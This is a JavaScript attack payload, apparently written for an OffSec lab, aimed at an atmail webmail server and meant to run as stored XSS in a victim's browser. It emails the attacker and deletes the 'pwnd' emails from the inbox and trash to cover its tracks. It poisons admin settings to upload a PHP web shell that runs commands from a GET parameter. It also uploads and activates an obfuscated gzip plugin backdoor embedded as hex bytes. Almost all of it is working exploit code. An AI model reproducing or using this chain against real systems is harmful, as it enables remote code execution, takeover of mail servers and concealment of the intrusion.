/* 
// The uri inbox
http://atmail/index.php/mail/mail/listfoldermessages/selectFolder/INBOX',true);

// Delete emails from inbox
// http://atmail/index.php/mail/mail/movetofolder/fromFolder/INBOX/toFolder/INBOX.Trash?resultContext=messageList&listFolder=INBOX&pageNumber=1&mailId%5B%5D=5

// Delete emails from trash
// http://atmail/index.php/mail/mail/movetofolder/fromFolder/INBOX.Trash/toFolder/INBOX.Trash/actuallyDelete/1?resultContext=messageList&listFolder=INBOX.Trash&pageNumber=1&mailId%5B%5D=4
I discovered that we can combine the uri for deletion from inbox and deletion from trash using:
http://atmail/index.php/mail/mail/movetofolder/fromFolder/INBOX/toFolder/INBOX.Trash/actuallyDelete/1?resultContext=messageList&listFolder=INBOX&pageNumber=1

*/
function send_email() 
{ 
    var email = "attacker@offsec.local";
    var subject = "hacked!";
    var message = "This is a test email!";
    var uri ="/index.php/mail/composemessage/send/tabId/viewmessageTab1";
    var query_string = "?emailTo=" + email + "&emailSubject=" + subject + "&emailBodyHtml=" + message;
    xhr = new XMLHttpRequest();
    xhr.open("GET", uri + query_string, true);
    xhr.send(null);
}
send_email();
function read_body(xhr) {
   var data;
   if (!xhr.responseType || xhr.responseType === "text") {
       data = xhr.responseText;
   } else if (xhr.responseType === "document") {
       data = xhr.responseXML;
   } else if (xhr.responseType === "json") {
       data = xhr.responseJSON;
   } else {
       data = xhr.response;
   }
   return data;
}
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        data = read_body(xhr);
        console.log(data);
    }
}
function neatAndTidy()
{
    var email_ids = document.getElementsByName("mailId[]");
    var email_subjs = document.getElementsByClassName("mailSubject");
    console.log(email_ids);
    console.log(email_subjs);
    var target = `http://atmail/index.php/mail/mail/movetofolder/fromFolder/INBOX/toFolder/INBOX.Trash/actuallyDelete/1?resultContext=messageList&listFolder=INBOX&pageNumber=1`;
    for(let i = 0; i < email_subjs.length; ++i) 
    { 
        if (email_subjs[i].textContent.includes("You haz been pwnd"))
        {   
            // delete request
            //console.log('deleting', email_ids[i].attributes[2].nodeValue);
            target+=`&mailId%5B%5D=${email_ids[i].attributes[2].nodeValue}`
        }
    }
    // remove email from backend
    xhr.open('POST',target,true);
    xhr.send(null);
    // remove email from frontend
    document.querySelector('#folder_inbox > a:nth-child(1)').click();
}
function createContact()
{
    var target = 'http://atmail/index.php/mail/contacts/updatecontact';
    var fname = '1eqweq';
    var lname = 'sdsdfs';
    var pnum='1234567890';
    var email='test%40test.com';
    var street_addrs ="sdfsdfs";
    var city="sdfsdfsdfsqwq";
    var state="sdfsdfs";
    var zip="12345";
    var country="xzczxcz";
    var params = `contact%5Bid%5D=&contact%5BserverID%5D=&contact%5BNewContact%5D=1
    &contact%5BGroupID%5D=&contact%5Bfavourite%5D=0&contact%5BUserFirstName%5D=${fname}
    &contact%5BUserLastName%5D=${lname}
    &contact%5BnumberFieldName%5D%5B%5D=UserHomePhone&contact%5BnumberValue%5D%5B%5D=${pnum}
    &contact%5BemailFieldName%5D%5B%5D=UserEmail&contact%5BemailValue%5D%5B%5D=${email}
    &contact%5BUserHomeAddress%5D=${street_addrs}
    &contact%5BUserHomeCity%5D=${city}&contact%5BUserHomeState%5D=${state}
    &contact%5BUserHomeZip%5D=${zip}&contact%5BUserHomeCountry%5D=${country}
    &contact%5BUserWorkAddress%5D=&contact%5BUserWorkCity%5D=
    &contact%5BUserWorkState%5D=&contact%5BUserWorkZip%5D=
    &contact%5BUserWorkCountry%5D=
    &contact%5BUserWorkCompany%5D=&contact%5BUserTitle%5D=
    &contact%5BUserMiddleName%5D=&contact%5BUserDOB%5D=
    &contact%5BUserURL%5D=&contact%5BUserWorkTitle%5D=
    &contact%5BUserWorkDept%5D=&contact%5BUserInfo%5D=`;
    target += '?' + params;
    xhr.open('POST',target,true);
    xhr.send(null);
}
function injectWebShell() {
    var global_settings_poison_url = `http://atmail/index.php/admin/settings/globalsave?save=1&fields%5Bsql_host%5D=127.0.0.1
    &fields%5Bsql_user%5D=root&fields%5Bsql_pass%5D=956ec84a45e0675851367c7e480ec0e9&fields%5Bsql_table%5D=atmail6&fields%5BtmpFolderBaseName%5D=`;
    xhr.open("POST", global_settings_poison_url, false);
    xhr.send(null);
    var webshell_url = 'http://atmail/index.php/mail/composemessage/addattachment/composeID/';
    xhr.open("POST", webshell_url, false);
    var boundary = '---------------------------';

    boundary += Math.floor(Math.random()*32768);
    boundary += Math.floor(Math.random()*32768);
    boundary += Math.floor(Math.random()*32768);
    xhr.setRequestHeader("Content-Type", 'multipart/form-data; boundary=' + boundary);
    var body = '';
    body += '--' + boundary + '\r\n' + 'Content-Disposition: form-data; name="newAttachment"; filename="cucked.php"';
    body += '\r\n\r\n';
    body += "<?php system($_GET['cmd'])?>";
    body += '\r\n'
    body += '--' + boundary + '--';
    xhr.send(body);
}
function uploadPluginBackdoor()
{
    var pre_install_url = `http://atmail/index.php/admin/plugins/preinstall`;
    var name = "newPlugin";
    var filename = "module.tgz";
    var body = '\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03\xed\x59\x7b\x6f\x1b\x37\x12\xcf\xbf\x11\xe0\xef\xc0\x0a\x46\xb5\x02\x64\x49\x2b';
    body += '\xf9\x71\xb1\x13\xf7\x5c\x3b\x69\x8d\xb6\xb6\x21\xbb\x09\x70\xd7\x83\x4c\xed\x52\x12\xe1\x15\xb9\x25\xb9\x56\x94\xd6\xdf';
    body += '\xfd\x66\xc8\x5d\x3d\x6c\xc9\x8f\x5c\xe2\xde\xe1\x38\x70\x24\x2d\x77\x38\x33\x9c\xdf\xcc\x70\xc8\x8c\x64\x9c\x25\x4c\x37';
    body += '\x5e\x7c\x45\x6a\x02\xed\xec\xec\xe0\x77\xb8\xb3\xd5\x9c\xff\x2e\xe8\x45\xb8\xd9\x6e\xee\x6c\x6f\xb7\xb6\x76\x60\x3c\x6c';
    body += '\x6d\xb6\x5b\x2f\xc8\xd6\xd7\x34\xaa\xa0\x4c\x1b\xaa\x08\x79\x71\x4d\x07\x8a\x0a\xb3\x92\xef\xa1\xf7\xff\xa3\x34\xca\xf1';
    body += '\x1f\x51\x9e\x7c\xad\x20\x78\x3a\xfe\xed\xf6\xd6\xa6\xc7\xff\x39\x68\x01\xff\x34\xc9\x06\x5c\x7c\xf1\x62\xf0\x74\xfc\xb7';
    body += '\x9a\xed\x2d\x8f\xff\x73\xd0\x52\xfc\x0f\xcc\x17\x2d\x07\x4f\xc7\x7f\xbb\xb5\xe9\xf3\xff\x59\xe8\x3e\xfc\x2f\x98\x36\x5f';
    body += '\x22\x08\x9e\x80\x7f\x7b\x13\xc7\xc3\x9d\x70\x3b\xf4\xf8\x3f\x07\x3d\x88\x3f\x17\x51\x92\xc5\xff\x51\x87\xf8\x64\xfc\x5b';
    body += '\xf0\x73\xc7\xe3\xff\x1c\xf4\x78\xfc\x95\xae\xa7\xc3\xf4\x73\x74\x3c\x80\xff\x4e\xb3\x1d\xce\xf0\x6f\x6f\x02\xfe\xad\x10';
    body += '\xfb\xff\xe6\x97\x5e\xec\x32\xfa\x3f\xc7\xff\xf5\x77\x00\xea\x5a\x49\x33\xd3\x35\x7c\xc4\xba\x09\x1f\x71\x43\x82\x66\x75';
    body += '\x6f\xad\xb4\xfe\xfe\x6d\xe7\xfc\xf8\xf4\x84\xbc\x21\xe5\xb0\xde\x2c\xe3\x10\x4f\xe1\xa9\x12\xbe\x6a\xd5\xc3\xed\xbf\xd5';
    body += '\xc3\xf0\x55\x3d\x6c\xbf\xaa\xec\x11\xd2\x68\x90\xc3\x1f\x0f\x4e\x7e\x78\x4b\x2e\x7e\x3c\x3e\x07\xce\x54\x2a\x03\xbc\x61';
    body += '\xab\xbd\x09\xaf\x2d\xdd\xe1\x89\x86\x99\xb8\xea\x6a\xfe\x89\x21\xe7\x66\xb3\x89\x2a\xc6\x8a\x1b\xd6\xa5\x30\x22\xb2\x24';
    body += '\xc1\x11\xa6\x94\x54\x0b\x23\x7a\xc8\x92\x04\x2d\xc9\x04\x1d\x31\xb2\x41\xf7\xc8\x78\x8f\xf0\x78\x8f\x34\x7a\x5c\x34\xf4';
    body += '\x90\x6c\xf0\x0a\x32\xc6\x94\x8d\xa4\x00\x4e\x2b\x3a\x66\xbd\x6c\x90\x3f\xac\x95\x1a\x0d\xfc\x47\x8e\x2c\x0b\xd7\x8c\xc8';
    body += '\x4c\x69\x96\xf4\x09\xef\x93\x54\x6a\xcd\x7b\x09\x23\x46\x12\x7a\x2d\x79\x4c\x3e\xc9\x51\x8f\x33\x4d\x12\x6a\x98\x72\x93';
    body += '\xed\xf4\x34\x12\x26\xe9\xf6\xa5\xba\x22\x5c\x93\x21\x55\x71\x32\x21\xec\x9a\x29\x98\x07\x59\x44\x41\x48\x8d\xf4\x32\x43';
    body += '\xc6\x1c\x4c\xa6\x49\x22\xc7\x24\xd3\x28\x37\x2e\x14\x5b\x39\xa0\x9c\x00\x16\x24\x55\x32\x62\x5a\x13\x2a\xe2\x45\xcd\x75';
    body += '\x42\x3e\x80\x4f\x87\x84\x12\xa3\x26\xf5\x7a\x7d\xad\x04\x86\x06\xfd\x4c\x44\x86\x4b\xd1\x65\x1f\xb9\x36\x3a\xa8\xcc\x0c';
    body += '\xaa\x54\xab\xe4\x8f\xb5\xd2\x4b\x90\xfe\x0e\xed\x43\x91\x43\x7a\x0d\x8b\x1a\x32\x92\x52\xc5\x84\x99\xaa\x83\xd9\x06\x58';
    body += '\xd7\x53\x50\xf8\x66\x6e\x51\x01\x46\xc2\x4b\xf8\x43\x5d\xee\xed\x1b\xb2\x11\x3a\xc1\x2f\x53\xc5\x85\xe1\x26\x28\xbf\xed';
    body += '\x74\x4e\x3b\xbb\xe4\x90\x8a\x8a\x21\x38\xaf\x6c\xe7\xbd\x44\xb1\x41\x68\x7f\xdf\x2c\xca\xc9\x25\x58\x06\x08\x37\x1b\x1d';
    body += '\x67\xce\x26\x1c\xd3\x6e\x86\xb3\xfe\x17\x7a\xe5\x8c\x8e\x32\xb5\x60\x35\x25\x1a\xbe\x60\xf5\x24\x61\x34\x46\x5c\x90\xfd';
    body += '\x03\x7a\x5a\x0a\xc0\x41\x67\x51\xc4\x58\x8c\x88\x8e\x99\xb5\x8b\xc5\xb9\x0d\x80\x30\xff\xd8\x85\xc0\xd7\x3c\x0e\xaa\x2b';
    body += '\x56\x85\x81\x57\xac\xaa\x60\x5d\xba\x32\x74\xdd\x34\xd6\x42\x18\xbc\x21\x2c\x81\x90\x42\x79\x53\x71\x1f\x0e\x3a\x27\xc7';
    body += '\x27\x3f\xec\x92\x77\x10\x18\x60\xd5\x7c\x0c\x00\xba\x17\x43\x08\x20\xf8\xfb\x3d\x83\x04\x20\x91\x1c\xa1\x34\xc4\x4c\x48';
    body += '\xf0\x29\x35\x34\xa9\x5b\xdd\x37\x79\xe4\x1d\x0e\xa9\x18\xb8\x08\x25\x9a\xf6\x19\x89\xb9\x62\x91\x91\x6a\xb2\x56\x8a\x86';
    body += '\xf0\x10\x94\x1b\x76\x82\xe5\xee\x80\x22\x80\x9e\x8a\x09\xc9\x46\x54\x5f\xa1\x43\xb8\x18\x32\xcc\x36\xf0\x89\x1d\x73\x79';
    body += '\x3f\xcb\x0c\x69\x9d\xae\x30\x9a\x61\x2d\x36\xe9\x6c\xdc\x4d\x83\xff\x34\x65\x62\xfa\x3e\x92\x42\x30\x1b\x8b\x98\xa1\x32';
    body += '\xba\x02\x57\xf4\xf1\x5b\x02\x57\x00\xa5\xa3\x46\x6c\x55\x80\x2f\xc8\x68\x21\xdd\xb7\x36\xaa\x46\xda\x56\x31\xc2\xf2\x8d';
    body += '\x9d\x59\x5d\x74\x5c\xce\x07\x81\x63\x27\xe6\x10\xcc\x10\x28\x3c\x72\x9e\xd2\xb1\x70\x76\x16\x21\x62\xb3\x5e\x47\x8a\xa7';
    body += '\xe0\x18\x9d\xb2\x08\x8c\xa2\x4a\xd1\x49\xb0\x56\x82\x92\xd4\x24\x6f\xf6\xf3\xe7\x72\xca\x53\x56\xae\x91\xb2\x2a\x57\x6b';
    body += '\x36\x1c\xb5\x89\xb9\x40\x44\x28\xc1\x77\xe0\x0c\x6a\x5c\x18\x0e\x79\x12\xbb\x84\x56\x10\x77\xa4\xaf\xe4\xc8\x8a\x0b\x97';
    body += '\x88\x1b\xcf\x89\x93\x50\x07\xee\x97\x67\xab\x1f\x60\x6a\xc5\xb5\x96\x8b\x23\x85\x38\xf0\xc6\xa3\xc5\x39\x64\xd7\x8b\xcc';
    body += '\x79\x63\x1d\xd4\x75\xd0\x58\x8f\x01\x1c\x8b\x9e\x42\xb8\x40\xae\x76\x33\x2d\x38\x5c\x77\x15\xd3\x50\xaa\x22\x16\x14\xa2';
    body += '\xaa\xb7\xc0\x5a\x28\x05\x7a\x86\xc8\x4a\xd0\x98\xb1\xf5\x72\x62\x86\x5c\x0c\x30\x9c\x85\x14\x1b\xbd\x04\xc2\x00\x9e\xf3';
    body += '\xd8\xa5\x5a\x8a\x5d\x72\x1a\x45\x98\xec\x50\x44\x27\xd6\xf1\xda\x2d\xd2\xf2\xd6\x50\x88\x80\xf5\xcb\x6c\x30\x04\xe7\xc0';
    body += '\xfb\x11\xa4\x77\x02\x11\x49\x0c\xa8\xd7\xb6\xea\x0e\xd9\x84\x8c\x25\x58\x06\x7b\x5e\xc1\x62\xba\x85\xb2\xc0\x2d\xf8\x9f';
    body += '\xcd\x7f\xd5\x88\x8d\xc8\x7b\x78\xc2\x47\xf0\xb4\xee\xe5\xd1\xd6\xea\x3c\xe5\xa6\xee\x3b\xc7\x92\xa5\x75\x3f\xc3\x45\x22';
    body += '\x3c\x50\x28\x16\x32\x10\x3d\x04\xc9\xb4\x6b\x73\x29\xcf\xef\x31\x20\xce\x48\x10\x4e\xeb\xfd\xe1\x90\x41\xfe\x41\xc1\x23';
    body += '\x0c\x0a\x88\xec\x93\x8b\xc3\xb3\x85\x04\xb5\x35\xb0\xcf\x64\xdf\xd9\x51\x5d\x51\xd0\xcf\xad\xc6\xd9\x44\x70\xa5\x1a\x71';
    body += '\x01\x7b\x60\x9c\xd7\xc1\x1e\xac\xec\x6a\x6f\xbe\x5a\xdf\xd1\x7d\x7e\x71\x74\xfa\xeb\xc5\x82\xce\xc2\x87\xf7\xeb\x2d\x82';
    body += '\xf5\x11\x4a\x3f\x50\xe8\x5b\x32\x90\x01\x7b\xac\xad\x9d\x58\x38\x21\x37\xd0\x84\x58\x42\x0c\xe6\xee\x06\xab\xb4\x1c\x31';
    body += '\x37\xa9\xe0\x83\xb4\x4c\xf3\xcc\x2c\xf6\x6c\xd8\x3f\x72\xbb\x71\x0a\xfc\x02\xc3\xb0\xc8\x63\xd8\xd9\x56\xc4\xa5\x65\x2e';
    body += '\x75\x2e\x26\xa6\xd0\x5b\x4b\xd7\x45\x36\xea\x46\xb6\x50\xc7\x5d\xe4\x85\x4d\x04\x26\x2f\x84\x67\x90\x0b\x85\xb9\x79\xef';
    body += '\xe3\x2a\x23\xf6\x3c\x35\xdb\xf2\x38\x90\xd1\xe2\x63\xbb\x91\x45\x54\xcc\x0a\x8f\x4d\x79\x84\xd7\x89\xaf\xc1\x46\x25\x62';
    body += '\xc7\x1d\xc3\xa6\x81\xe1\x92\xfb\xb1\xa2\x71\x21\xc7\x27\x39\x12\x5c\x74\x17\x17\xe1\xcc\x28\x20\xb1\x1b\xb5\xed\x98\xaa';
    body += '\x64\x16\x9d\xa7\x87\x3f\x91\xce\xdb\x83\xa3\x1c\x88\x75\x2e\xd0\x73\x50\xe8\x71\xf2\x54\xd2\xac\xb1\x73\x6c\x2b\x65\xed';
    body += '\x12\x27\x21\x17\xd7\xb7\x0e\x98\x4f\x43\xf7\xba\xba\x80\xf5\x2a\x27\x2c\x2c\xd3\x45\x1c\xd6\x49\x1b\x02\xe8\x09\x1b\x07';
    body += '\x26\x4a\xef\x26\xc2\xcc\x15\x73\x40\x3e\xc6\x1d\x2e\x42\xee\x71\xc8\x9c\xbc\xc7\x39\xc5\x4a\x5c\xe1\x96\xdc\xbb\x9f\xeb';
    body += '\x12\x17\xc2\x9f\xe9\x92\xd6\xe3\x5d\x02\x7a\x1e\x76\x49\xeb\x29\x2e\x01\x89\x4f\x70\x89\xf5\x4a\x3f\x4a\xa4\xce\x19\xf0';
    body += '\x45\xf1\x5c\x84\xd6\xdd\xb1\x70\xc9\x98\x4b\x63\xbb\x55\x16\xe3\xf9\xae\x57\xf4\x55\x3f\xf3\x2b\xe6\x6c\x75\x6d\x7e\x2c';
    body += '\xe1\x90\x00\x1d\x9b\xdd\xcc\x6c\xdf\x59\x81\xb6\x6b\xda\xe7\xc5\xc5\x29\xc3\x4e\x0e\x8e\x11\x33\x6c\x99\xf9\x20\x53\x78';
    body += '\x02\x31\x64\x08\x07\x04\xc8\x59\xc5\x5c\x3b\x57\x54\xa1\x04\xf5\x50\x04\x34\x85\xb3\x85\x93\x57\x05\x73\xf3\xf6\xbf\x70';
    body += '\x17\xf8\x0f\x8a\x0b\xe8\x76\x18\xb9\x96\x2a\xe7\x9e\x2b\xb5\xa4\x9c\xb3\xfd\x26\xca\xf3\x5e\xfb\x6e\x9f\xe0\xd7\x5a\xe9';
    body += '\xaf\x3e\x98\x7a\x7a\x16\x7a\xf0\xfe\xe7\xcc\x8e\x7d\xee\xd5\x8f\xa5\x07\xee\x7f\xda\xdb\xad\xad\xd9\xfd\x4f\xd8\x7e\xd1';
    body += '\x6c\x85\xe1\x66\xd3\xdf\xff\x3c\x07\xd9\xfb\x9f\x52\x29\x4a\x28\xb4\x59\x0e\xf7\x2e\xe2\xde\x75\xb8\xc3\x51\xdc\xc0\x5e';
    body += '\x31\x7d\x75\x28\x85\x51\x32\x49\x98\xca\x19\x4a\x7f\xe0\x39\x85\xd8\x0f\x28\x4d\x06\x0a\x16\x94\xb8\xf5\xae\x0b\xa5\x77';
    body += '\xd0\xbb\x9c\xe0\x05\x0d\xc1\xbb\x1a\x94\x5b\xd9\x5b\xc1\x7a\x90\x41\xe7\xae\x90\xed\x7b\x05\x1b\xd8\x4f\x72\x4c\x93\xe8';
    body += '\xd3\xe4\x8a\xbc\xee\xc1\xf3\xdf\x01\xa5\x7e\xbf\x4e\xad\x15\x75\x68\xdb\xf6\x57\x0a\x3a\xca\xcf\x30\xdc\x1e\xc5\x2b\xe7';
    body += '\x7c\x94\x42\x37\xe7\xde\xc1\x11\x00\x38\x7b\x70\x02\x16\x1c\x4f\x05\xda\xd8\x8b\x18\x68\xae\x79\x7f\x52\xf0\xe8\x89\x36';
    body += '\x6c\x84\xcd\xe0\x58\x2a\xec\xd4\x57\xaa\x3a\x94\xe9\x44\xf1\xc1\x10\xf7\xb6\xca\xec\x61\x71\x01\x2b\x67\xff\xaa\xec\x0d';
    body += '\xd6\xca\xf7\x27\x30\xa0\x73\x8e\x97\x77\x5f\xbf\x87\x13\x41\xbe\xc6\xb0\xde\xac\x37\xef\xb1\x72\x94\x52\x6b\xe2\x76\x3d';
    body += '\xac\x6f\x2d\x97\xf6\x8b\xad\x03\xc8\x84\x1e\xce\x65\xd9\x43\xdd\x35\xb4\xdd\xc0\x96\x48\xe0\x3a\xa3\x03\xe4\xe9\xd3\x44';
    body += '\xb3\xbd\x92\xd3\x97\xf5\x12\x1e\x91\xe9\x36\x14\x73\x38\xf2\x99\x68\xf8\xb3\x94\xe9\x39\xa4\x96\xc9\xd2\xe0\x1f\x10\x42';
    body += '\xf3\xa1\xd3\x61\xbf\x67\x18\x63\x07\x3d\xd8\x83\x28\x6c\x71\xd0\x57\xd8\x91\xaa\x15\xe9\x42\x0a\xa9\x18\x07\x9d\xeb\xb0';
    body += '\xa1\xea\x8d\xfd\x01\x33\xf9\xec\xa0\xba\x37\xe5\xc3\x5d\x2e\x28\x98\x2d\xd3\x4c\x1b\xc6\x9f\xbb\xdf\xa9\x70\x11\xb3\x8f';
    body += '\x15\xf2\xed\xb7\x64\x81\xf7\xc0\x5a\x7e\x87\xaf\x4a\xfe\xfc\x73\xaa\x01\xe9\x11\x1a\x28\x44\xf1\x23\x14\x80\x33\x61\xa7';
    body += '\xb7\xd7\x73\x0b\x1a\xf2\x45\x2e\x38\xdb\xa8\x8c\xcd\x56\x7a\x53\x72\x9f\x4b\x7d\x9f\x4a\x6d\x8e\x72\xff\x7f\xbe\xd3\x6d';
    body += '\x0f\x76\xdb\x90\x3b\x96\xa6\xce\xba\x79\x58\x74\x2a\x05\x74\x48\x55\xfb\xf8\xbd\x8c\x27\xf3\x10\xcd\x4f\x02\x03\xba\x8a';
    body += '\xa5\x09\x8d\x58\x50\x7e\xdd\xe8\x01\xeb\x3e\x5e\x6d\xbc\xfe\x66\x63\x23\xcf\xc2\x69\xf2\x91\x8d\x8d\xfd\xdf\xc4\x8c\xc9';
    body += '\xca\xb8\x2d\x77\xa9\x11\x3a\x37\xe2\xf6\x8c\xc2\x85\xd3\xba\xb5\xd4\x97\x30\x1b\x22\xf7\xb6\x6f\xd0\x65\xd0\x95\x75\xa5';
    body += '\x00\xd3\x0f\xce\xce\xba\x9d\xd3\xd3\x0b\x52\x2f\xd3\x34\x85\xd9\x14\x67\x36\x96\x6e\xa9\x4f\xfd\x7f\x96\xf2\x9c\xc1\x8d';
    body += '\x86\x2b\x49\x41\xa5\x91\x69\x65\x2f\xb8\x45\x44\x6e\xdd\xc1\xdb\x8b\xf6\xca\xdc\xac\xf5\xb8\x07\xae\xfe\x84\x51\xd0\x61';
    body += '\x03\x0e\x3e\x9f\xec\xee\x82\x8b\x82\x72\xdc\x3b\x88\x69\x0a\x67\xea\xf2\x22\xfb\xc6\x3e\xc4\x83\x9a\x00\x03\xf4\x98\xc4';
    body += '\xd8\x53\x30\x04\x83\xbb\x57\x26\x97\x68\xa6\x2b\xfa\xe7\xcc\x18\x80\x46\x5f\xae\x12\x10\x41\xa3\x8f\xd7\x4e\x56\xc4\xb2';
    body += '\x89\x24\xb8\xe4\xf1\x25\xc1\x46\x14\x52\x46\x76\x61\xf5\x8a\x8d\xdc\xcd\x2e\x1f\x51\x35\x21\x57\x6c\x52\x23\x97\xf0\x89';
    body += '\x69\x73\x49\xae\xa9\x82\x53\xb4\x0a\xc2\x56\xd5\x0d\xbf\xa7\x49\x06\xe3\x06\x36\xa8\x1a\xb1\x09\x3b\xc7\x1d\x4c\x7f\x56';
    body += '\xab\x85\x8d\x37\xf7\x62\xfd\x9e\xb3\x71\x07\x7c\xc5\xd4\xb9\xdd\x3d\xee\x20\xdf\x68\x28\x88\x08\x25\x48\xb9\x01\xf9\x35';
    body += '\x6c\x18\xd9\xc8\x9b\x7c\x80\xcb\x8c\x92\xf2\x1d\x2d\x0f\xab\x72\x75\x61\x41\xd5\x4d\x09\x72\xfb\xaf\x6e\x0a\x3c\x79\xf2';
    body += '\xe4\xc9\x93\x27\x4f\x9e\x3c\x79\xf2\xe4\xc9\x93\x27\x4f\x9e\x3c\x79\xf2\xe4\xc9\x93\x27\x4f\x9e\x3c\x79\xf2\xe4\xc9\x93';
    body += '\x27\x4f\x9e\x3c\x79\xf2\xe4\xc9\x93\x27\x4f\xff\xd5\xf4\x6f\x05\xc6\x60\xd0\x00\x50\x00\x00';
    xhr.open("POST", pre_install_url, false);
    var formData = new FormData();
    var payload = new Uint8Array(body.length);
    for (var i = 0; i < payload.length; i++)
    {
        payload[i] = body.charCodeAt(i);
    }
    var blob = new Blob([payload])
    formData.append(name, blob, filename);
    xhr.send(formData);
    /*boundary += Math.floor(Math.random()*32768);
    boundary += Math.floor(Math.random()*32768);
    boundary += Math.floor(Math.random()*32768);
    xhr.setRequestHeader("Content-Type", 'multipart/form-data; boundary=' + boundary);
    var body = '';
    body += '--' + boundary + '\r\n' + 'Content-Disposition: form-data; name="newPlugin"; filename="module.tgz"';
    body += '\r\n\r\n';
    body += "<?php system($_GET['cmd'])?>"; // file data here
    body += '\r\n'
    body += '--' + boundary + '--';
    xhr.send(body);
    */
}
function activatePluginBackdoor()
{
    var plugin_url = 'http://atmail/index.php/admin/plugins/add/file/bW9kdWxlLnRneg==';
    xhr.open("GET",plugin_url, true);
    xhr.send('null');
}
//createContact();
//injectWebShell();
neatAndTidy();
uploadPluginBackdoor();
activatePluginBackdoor();

